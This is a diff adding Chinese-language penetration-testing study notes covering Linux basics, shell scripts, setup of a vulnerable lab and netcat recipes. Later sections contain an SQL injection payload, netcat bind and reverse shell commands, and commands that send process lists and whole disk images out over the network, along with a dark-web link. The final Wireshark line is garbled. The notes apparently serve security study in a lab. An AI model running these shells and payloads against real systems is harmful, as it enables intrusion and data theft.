@@ -1,0 +1,184 @@
+﻿
+--基本操作-----------------------------------------------------------------------------------------------------
+	ls	显示文件信息
+		ls -l				显示文件详细	(d目录 -文件 c设备 l链接 b块)
+		ls -a			显示隐藏文件
+		ls -h			文件大小以KM等单位显示
+		ls --sort=size		按大小排序
+		ls --sort=time	按时间排序
+	cd		进入目录
+	pwd	当前目录
+	cat		查看文件内容
+	more	分屏查看文件内容
+	less		分屏查看文件内容(不显示文件百分比)
+	tail		显示文件最后10行
+		tail -20 /var/log/message				显示文件最后20行
+		watch -n 2 tail -20 /var/log/message	每隔2秒实时查看文件最后20行
+	cp	复制
+		cp -r A/ B	复制文件夹及所有内容
+	rm	删除
+		rm -r B 		删除文件夹及所有内容
+	top	监视系统性能	输入k结束进程
+	ps	查看进程信息
+		ps -ef	查看进程信息
+		ps aux	查看进程信息
+	grep
+		grep ss /etc/passwd	只显示文件中含有ss的信息
+	ifconfig	查看网络信息
+		ifconfig eth0 down					将网卡eth0关闭
+		macchanger -m 00:11:11:11:11:11 eth0	修改网卡MAC地址
+		ifconfig eth0 up						将网卡eth0开启
+			/etc/resolv.conf文件配置网络信息
+	netstat -pantu	在内核中访问网络连接状态及其相关信息的程序，它能提供TCP连接，TCP和UDP监听，进程内存管理的相关报告。
+		netstat -pantu | egrep -v '0.0.0.0|:::'												不显示0.0.0.0和:::的信息
+		netstat -pantu | egrep -v '0.0.0.0|:::' | awk '{print $5}'								不显示0.0.0.0和:::的信息，只显示第5列
+		netstat -pantu | egrep -v '0.0.0.0|:::' | awk '{print $5}' | cut -d ':' -f 1					不显示0.0.0.0和:::的信息，只显示第5列，只显示冒号前面的信息
+		netstat -pantu | egrep -v '0.0.0.0|:::' | awk '{print $5}' | cut -d ':' -f 1 | sort				不显示0.0.0.0和:::的信息，只显示第5列，只显示冒号前面的信息，排序
+		netstat -pantu | egrep -v '0.0.0.0|:::' | awk '{print $5}' | cut -d ':' -f 1 | sort | uniq			不显示0.0.0.0和:::的信息，只显示第5列，只显示冒号前面的信息，排序，去重
+		netstat -pantu | egrep -v '0.0.0.0|:::' | awk '{print $5}' | cut -d ':' -f 1 | sort | uniq	 > ip	不显示0.0.0.0和:::的信息，只显示第5列，只显示冒号前面的信息，排序，去重，输出为ip文件
+		netstat -pantu | egrep -v '0.0.0.0|:::' | awk '{print $5}' | cut -d ':' -f 1 | sort | uniq	 >> ip	不显示0.0.0.0和:::的信息，只显示第5列，只显示冒号前面的信息，排序，去重，输出为ip文件追加方式
+	mount	挂载目录
+		mount -o loop kali.iso /media/cdrom	
+	dmesg	查看/var/log/message的信息
+	find		查找
+		find / -name nmap	查找根目录下所有含有nmap的文件
+		find / -iname nmap	查找根目录下所有含有nmap的文件（不区分大小写）
+		find . -name "ps*"		查找当前目录下含有ps的文件
+		find . -name "ps* " -exec cp {} /tmp/{}.bak \;		将查找的文件复制到tmp
+	whereis nmap	查找文件（索引）
+		whereis -b nmap		查找文件（索引），二进制文件
+		updatedb			更新索引
+	echo	
+	vi	编辑器
+		vi ip	编辑ip文件	
+		:set nu	显示行号
+		:wq!	保存退出
+		i		插入
+		a		添加
+		dd		删除一行
+		o		当前下面插入一行
+		y		复制当前行
+		g		粘贴一行
+	管道符号
+		|		cat /etc/passwd | grep ssl	复制有ssl的行
+		&		cd aaa & ls				前后依次执行
+		&&		cd aaa && ls				如果前面的执行成功，后面的依次执行
+		||		cd aaa || ls				如果前面的未执行成功，后面的依次执行
+shell脚本
+	1.sh
+		#! /bin/bash
+		echo -n "IP: "
+		read ip
+		echo "your ip is:"  $ip
+	chmod +x 1.sh
+	./1.sh
+	
+	99.sh
+		#! /bin/bash
+		for n in `seq 9`
+		do
+			for m in `seq $n`
+			do
+				echo -n "$m*$n="`expr $m \* $n`"	"
+			done
+			echo
+		done
+	
+	ping.sh
+		#! /bin/bash
+		for n in `seq 254`
+		do
+			ping 192.168.1.$n -c 1 grep ttl | awk '{print $4}' | awk -F: '{print $1}'
+		done
+	
+	
+--更新
+apt-get install linux-header-$(uname - r)
+apt-get update
+apt-get upgrade
+apt-get dist-upgrade
+apt-get install ibus ibus-pinyin flashplugin-nonfree gdebi geany meld netspeed mtr chromium 
+
+--模拟环境配置-----------------------------------------------------------------------------------------------------
+--暗网wiki
+http://zqktlwi4fevo6ri.onion/wiki/index.php/Main_Page
+--虚拟机下载地址
+https://www.turnkeylinux.org/
+--metasploit
+https://metasploit.com
+--模拟防火墙
+http://m0n0.ch/wall/downloads.php
+
+
+目标环境配置(centos)
+	yum install httpd -y
+	yum install -y mysql-server mysql mysql-deve
+	yum install -y  php php-gd php-mbstring php-mysql
+
+	service httpd start
+	service mysqld start
+
+	chkconfig httpd on
+	chkconfig mysqld on
+
+	mysql_install_db
+	/usr/bin/mysqladmin -u root password '123'　　// 为root账号设置密码
+	mysql_secure_installation 
+	
+	vi /var/www/html/phpinfo.php
+		<?php phpinfo();?>
+
+下载虚拟机metasploitable-linux-2.0.0(含有各种漏洞的虚拟机系统)
+	sudo vim /var/www/mutillidae/config.inc 
+		$dbname = 'owasp10';
+	 owasp10 -> A1 -> SQLi -> User Info
+		SQL注入		' or 1=1#
+
+-----------------------------------------------------------------------------------------------------
+NETCAT
+	NC——telnet / banner
+		nc -nv 1.1.1.1 80
+	NC——传输文本信息
+		A:	nc -l -p 333			A机器开放4444端口
+		B:	nc -nv 1.1.1.1 333	B链接A机器4444端口
+		A:	nc -l -p 333	> ps.txt						A机器开放4444端口
+		B:	ls -l | nc -nv 192.168.100.142 333			B机器电子取证场景将信息传递
+		B:	ps aux | nc -nv 192.168.100.142 333 -q 1		B机器电子取证场景将信息传递（q 等待1秒退出）
+	NC——传输文件信息
+		A:	nc -l -p 333	> 1.mp4						A机器开放4444端口
+		B:	nc -nv 192.168.100.142 333 < 1.mp4 -q 1		B机器传递文件
+		A:	nc -lp 333 < a.mp4 -q 1 					A机器开放4444端口，等待B机器接收文件
+		B:	nc -nv192.168.100.142 333 > a.mp4			B机器接收文件
+		A:	tar -cvf - aaa/ | nc -lp 333					A机器开放4444端口，等待B机器接收目录文件
+		B:	nc -nv 192.168.100.142 333 | tar -xvf 			B机器传递目录文件
+		A:	nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4						A机器开放4444端口，等待B机器接收文件（加密传输）
+		B:	mcrypt --flush -Fbqd -a rijndael-256 -m ecb < 1.mp4 | nc -nv 192.168.100.142 333 -q 1		B机器传递文件
+	NC——流媒体服务
+		A:	cat 1.mp4 | nc -l -p 333								A机器开放4444端口
+		B:	192.168.100.142 333 < mplayer -vo x11 -cache 3000 -		B机器传递文件
+	NC——端口扫描
+		nc -nvz 1.1.1.1 1-65535
+		nc -vnzu 1.1.1.1 1-1024		UDP端口
+	NC——远程克隆硬盘
+		A:	nc -lp 333 | dd of=/dev/sda
+		B:	dd -if=/dev/sda | nc -nv 1.1.1.1 333 -q 1
+	NC——远程控制
+		A:	nc -lp 333 -c bash		--正向，Windwos把bash换成cmd
+		B:	nc -nv 1.1.1.1 333
+		A:	nc -lp 333				--反向
+		B:	nc -nv  1.1.1.1 333 -c bash
+	NC——NCAT
+		A:	ncat ncat -c bash --allow 192.168.100.142 -vnl 333 --ssl
+		B:	ncat -nv 1.1.1.1 333 --ssl
+WIRESHARK
+	ץ����̽Э�������ץ������Libpcap9����linux��winpcap10����Windows����������
+	
+	
+	
+	
+
+
+
+
+
+
